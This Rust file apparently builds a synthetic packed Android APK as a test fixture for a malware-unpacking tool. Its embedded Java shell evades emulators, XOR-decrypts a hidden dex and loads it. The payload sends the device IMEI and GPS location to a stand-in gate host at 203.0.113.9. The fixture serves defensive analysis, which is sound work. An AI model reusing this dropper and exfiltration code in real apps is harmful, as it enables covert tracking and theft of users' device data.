//! Build a synthetic packed APK for manual end-to-end runs.
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    let out = std::env::args().nth(1).unwrap_or_else(|| "target/fixtures/packed.apk".into());
    let shell = SHELL;
    let payload = PAYLOAD;
    let shell_dex = compile(&[("Shell", shell)]).expect("compile shell (need javac+d8+android.jar)");
    let payload_dex = compile(&[("Exec", payload)]).expect("compile payload");
    let key = [0x5au8, 0x1e, 0x73, 0x2c];
    let mut enc = payload_dex.clone();
    for (i, b) in enc.iter_mut().enumerate() { *b ^= key[i % key.len()]; }
    let apk = build_apk(&shell_dex, &enc);
    let path = PathBuf::from(&out);
    if let Some(dir) = path.parent() { std::fs::create_dir_all(dir).ok(); }
    std::fs::write(&path, &apk).unwrap();
    eprintln!("wrote {} ({} bytes)", path.display(), apk.len());
}
fn find(base_names: &[&str], leaf: &str) -> Option<PathBuf> {
    for base in base_names {
        let Ok(rd) = std::fs::read_dir(base) else { continue };
        let mut vs: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
        vs.sort();
        for v in vs.into_iter().rev() {
            let p = v.join(leaf);
            if p.exists() { return Some(p); }
        }
    }
    None
}
fn compile(sources: &[(&str, &str)]) -> Option<Vec<u8>> {
    let d8 = find(&["/opt/homebrew/share/android-commandlinetools/build-tools"], "d8")?;
    let javac = ["/opt/homebrew/opt/openjdk@17/bin/javac", "/opt/homebrew/opt/openjdk/bin/javac"]
        .iter().map(PathBuf::from).find(|p| p.exists())?;
    let android_jar = find(&["/opt/homebrew/share/android-commandlinetools/platforms"], "android.jar");
    static COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!("unshroud-fix-{}-{}-{}", std::process::id(), n, sources[0].0));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).ok()?;
    let mut srcs = Vec::new();
    for (name, src) in sources {
        let p = dir.join(format!("{name}.java"));
        std::fs::write(&p, src).ok()?;
        srcs.push(p);
    }
    let classes = dir.join("c");
    std::fs::create_dir_all(&classes).ok()?;
    let mut cmd = Command::new(&javac);
    cmd.arg("-d").arg(&classes).arg("--release").arg("8").arg("-nowarn");
    if let Some(j) = &android_jar { cmd.arg("-classpath").arg(j); }
    for s in &srcs { cmd.arg(s); }
    let o = cmd.output().ok()?;
    if !o.status.success() { eprintln!("{}", String::from_utf8_lossy(&o.stderr)); return None; }
    let mut files = Vec::new();
    walk(&classes, &mut files);
    let o = Command::new(&d8).arg("--min-api").arg("26").arg("--output").arg(&dir)
        .args(&files).env("JAVA_HOME", javac.parent()?.parent()?).output().ok()?;
    if !o.status.success() { eprintln!("{}", String::from_utf8_lossy(&o.stderr)); return None; }
    let dex = std::fs::read(dir.join("classes.dex")).ok()?;
    let _ = std::fs::remove_dir_all(&dir);
    Some(dex)
}
fn walk(d: &std::path::Path, out: &mut Vec<PathBuf>) {
    let Ok(rd) = std::fs::read_dir(d) else { return };
    for e in rd.flatten() {
        let p = e.path();
        if p.is_dir() { walk(&p, out); }
        else if p.extension().map(|x| x == "class").unwrap_or(false) { out.push(p); }
    }
}
fn build_apk(shell: &[u8], encrypted: &[u8]) -> Vec<u8> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        use zip::write::SimpleFileOptions;
        let mut w = zip::ZipWriter::new(&mut buf);
        let opts = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        w.start_file("classes.dex", opts).unwrap();
        w.write_all(shell).unwrap();
        w.start_file("assets/payload.dat", opts).unwrap();
        w.write_all(encrypted).unwrap();
        w.start_file("AndroidManifest.xml", opts).unwrap();
        w.write_all(&manifest()).unwrap();
        w.finish().unwrap();
    }
    buf.into_inner()
}
fn manifest() -> Vec<u8> {
    let strings = ["manifest","package","com.example.packed","versionName","1.0",
        "uses-permission","name","android.permission.READ_PHONE_STATE",
        "android.permission.ACCESS_FINE_LOCATION","android.permission.INTERNET",
        "activity","com.example.packed.MainActivity"];
    let mut pool_data = Vec::new();
    let mut offsets = Vec::new();
    for s in strings {
        offsets.push(pool_data.len() as u32);
        pool_data.push(s.chars().count() as u8);
        pool_data.push(s.len() as u8);
        pool_data.extend_from_slice(s.as_bytes());
        pool_data.push(0);
    }
    while pool_data.len() % 4 != 0 { pool_data.push(0); }
    let count = strings.len() as u32;
    let strings_start: u32 = 28 + count * 4;
    let pool_size = strings_start as usize + pool_data.len();
    let mut pool = Vec::new();
    pool.extend_from_slice(&1u16.to_le_bytes());
    pool.extend_from_slice(&28u16.to_le_bytes());
    pool.extend_from_slice(&(pool_size as u32).to_le_bytes());
    pool.extend_from_slice(&count.to_le_bytes());
    pool.extend_from_slice(&0u32.to_le_bytes());
    pool.extend_from_slice(&0x100u32.to_le_bytes());
    pool.extend_from_slice(&strings_start.to_le_bytes());
    pool.extend_from_slice(&0u32.to_le_bytes());
    for o in &offsets { pool.extend_from_slice(&o.to_le_bytes()); }
    pool.extend_from_slice(&pool_data);
    let mut out = Vec::new();
    out.extend_from_slice(&3u16.to_le_bytes());
    out.extend_from_slice(&8u16.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&pool);
    for (tag, an, av) in [(0u32,1u32,2u32),(0u32,3u32,4u32)] { out.extend_from_slice(&elem(tag, an, av)); }
    for v in [7u32, 8, 9] { out.extend_from_slice(&elem(5, 6, v)); }
    out.extend_from_slice(&elem(10, 6, 11));
    let n = out.len() as u32;
    out[4..8].copy_from_slice(&n.to_le_bytes());
    out
}
fn elem(tag: u32, an: u32, av: u32) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&0x0102u16.to_le_bytes());
    v.extend_from_slice(&16u16.to_le_bytes());
    v.extend_from_slice(&56u32.to_le_bytes());
    v.extend_from_slice(&1u32.to_le_bytes());
    v.extend_from_slice(&u32::MAX.to_le_bytes());
    v.extend_from_slice(&u32::MAX.to_le_bytes());
    v.extend_from_slice(&tag.to_le_bytes());
    v.extend_from_slice(&20u16.to_le_bytes());
    v.extend_from_slice(&20u16.to_le_bytes());
    v.extend_from_slice(&1u16.to_le_bytes());
    v.extend_from_slice(&[0u8; 6]);
    v.extend_from_slice(&u32::MAX.to_le_bytes());
    v.extend_from_slice(&an.to_le_bytes());
    v.extend_from_slice(&av.to_le_bytes());
    v.extend_from_slice(&8u16.to_le_bytes());
    v.push(0);
    v.push(3);
    v.extend_from_slice(&av.to_le_bytes());
    v
}
const SHELL: &str = r#"
package com.example.packed;
import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
public class Shell {
    static final byte[] KEY = { 0x5a, 0x1e, 0x73, 0x2c };
    public static void attach(Context ctx) {
        String fp = android.os.Build.FINGERPRINT;
        if (fp != null && (fp.contains("generic") || fp.contains("sdk"))) return;
        try {
            byte[] enc = readAsset(ctx, "payload.dat");
            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) dec[i] = (byte) (enc[i] ^ KEY[i % KEY.length]);
            java.io.FileOutputStream fos = ctx.openFileOutput("p.dex", 0);
            fos.write(dec); fos.close();
            DexClassLoader cl = new DexClassLoader(ctx.getFilesDir().getAbsolutePath() + "/p.dex",
                ctx.getCacheDir().getAbsolutePath(), null, Shell.class.getClassLoader());
            Class<?> c = cl.loadClass("com.example.payload.Exec");
            Method m = c.getMethod("fire", Context.class);
            m.invoke(null, ctx);
        } catch (Throwable t) { android.util.Log.e("shell", "attach failed: " + t); }
    }
    static byte[] readAsset(Context ctx, String name) throws Exception {
        InputStream in = ctx.getAssets().open(name);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        return out.toByteArray();
    }
}
"#;
const PAYLOAD: &str = r#"
package com.example.payload;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.location.Location;
import android.location.LocationManager;
import java.net.HttpURLConnection;
import java.net.URL;
public class Exec {
    public static void fire(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService("phone");
            String imei = tm.getDeviceId();
            LocationManager lm = (LocationManager) ctx.getSystemService("location");
            Location loc = lm.getLastKnownLocation("gps");
            String url = "http://203.0.113.9/gate?d=" + imei + "&lat=" + loc.getLatitude()
                + "&lon=" + loc.getLongitude() + "&m=" + android.os.Build.MODEL;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.connect();
            int code = c.getResponseCode();
        } catch (Throwable t) { android.util.Log.e("x", "fail " + t); }
    }
}
"#;
